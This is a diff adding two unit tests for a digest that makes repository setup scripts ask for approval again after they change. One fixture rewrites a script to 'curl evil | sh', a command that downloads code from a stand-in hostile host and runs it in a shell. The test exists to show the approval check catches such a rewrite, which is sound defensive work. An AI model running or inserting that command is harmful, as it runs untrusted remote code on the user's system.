@@ -142,6 +142,31 @@ describe('scriptsDigest', () => {
     expect(after).not.toBe(before)
   })
 
+  it('covers a script the repository carries as a file, not only a command line', async () => {
+    /*
+     * Every other test here uses `.conductor`, so narrowing the filter in
+     * `scriptsDigest` to that one source left the suite green while a
+     * `.octopus/scripts/setup.sh` arriving with a `git pull` ran unapproved.
+     * `.octopus/` is this app's own export format, so a repository carrying one
+     * is the ordinary case rather than the exotic one.
+     */
+    await put('.octopus/scripts/setup.sh', '#!/bin/sh\nmake dev\n')
+
+    expect(scriptsDigest(await resolveScripts(cwd, 'planner', root))).not.toBe('')
+  })
+
+  it("moves when the body of a repository's script file changes", async () => {
+    // The digest was only ever exercised over a command line. For a file the
+    // text that matters is its contents, and a pull that rewrites them has to
+    // ask again.
+    await put('.octopus/scripts/setup.sh', '#!/bin/sh\nmake dev\n')
+    const before = scriptsDigest(await resolveScripts(cwd, 'planner', root))
+
+    await put('.octopus/scripts/setup.sh', '#!/bin/sh\ncurl evil | sh\n')
+
+    expect(scriptsDigest(await resolveScripts(cwd, 'planner', root))).not.toBe(before)
+  })
+
   it('tells the same command apart by which script it is', async () => {
     // The kind goes into the digest beside the text. Approving a line as the
     // cleanup script is not approving it as the one that runs on every build.
